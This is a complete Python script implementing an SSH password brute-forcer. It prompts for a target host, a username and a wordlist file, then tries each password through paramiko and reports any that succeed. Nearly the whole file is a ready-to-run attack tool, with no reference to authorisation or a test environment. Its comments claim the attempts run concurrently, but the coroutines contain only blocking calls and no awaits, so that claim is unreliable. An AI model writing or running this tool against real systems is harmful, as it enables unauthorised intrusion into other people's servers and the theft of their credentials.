import paramiko  # Paramiko library for SSH connections
import asyncio  # Asyncio library for asynchronous programming

class SSHBruteForcer:
    """
    A class to perform SSH brute-forcing using asynchronous programming.
    """
    def __init__(self, target, username, password_list, port=22, timeout=5):
        """
        Initializes the SSHBruteForcer with target details and parameters.
        
        Args:
            target (str): The target IP/hostname.
            username (str): The SSH username.
            password_list (list): A list of passwords to attempt.
            port (int): The SSH port (default is 22).
            timeout (int): Connection timeout in seconds (default is 5).
        """
        self.target = target
        self.username = username
        self.password_list = password_list
        self.port = port
        self.timeout = timeout
        self.successful_attempts = []  # List to store successful password attempts

    async def try_password(self, password):
        """
        Attempts to authenticate with the given username and password asynchronously.
        
        Args:
            password (str): The password to try.
        """
        try:
            # Create an SSH client
            client = paramiko.SSHClient()
            # Automatically add the host key if missing
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # Attempt to connect using the given password
            client.connect(self.target, port=self.port, username=self.username, password=password, timeout=self.timeout)
            # If successful, store the password and print a success message
            self.successful_attempts.append(password)
            print(f"[SUCCESS] Password found: {password}")
            client.close()
        except paramiko.AuthenticationException:
            # Handle incorrect password
            print(f"[FAILED] Incorrect password: {password}")
        except Exception as e:
            # Handle other exceptions (e.g., connection issues)
            print(f"[ERROR] {e}")
    
    async def run_bruteforce(self):
        """
        Reads passwords and attempts to brute-force asynchronously.
        """
        # Create asynchronous tasks for all passwords in the list
        tasks = [self.try_password(password.strip()) for password in self.password_list]
        # Run all tasks concurrently
        await asyncio.gather(*tasks)

# Example usage
if __name__ == "__main__":
    # Prompt the user for target and brute-forcing details
    target = input("Enter target IP/hostname: ").strip()
    username = input("Enter username for SSH: ").strip()
    password_file = input("Enter path to password list: ").strip()
    
    # Read passwords from the specified file
    with open(password_file, 'r') as f:
        passwords = f.readlines()
    
    # Create an instance of SSHBruteForcer
    brute_forcer = SSHBruteForcer(target, username, passwords)
    # Run the brute-forcing asynchronously
    asyncio.run(brute_forcer.run_bruteforce())

    # Print the results
    if brute_forcer.successful_attempts:
        print("\n[RESULT] Successful passwords:")
        for pwd in brute_forcer.successful_attempts:
            print(pwd)
    else:
        print("\n[RESULT] No successful attempts.")
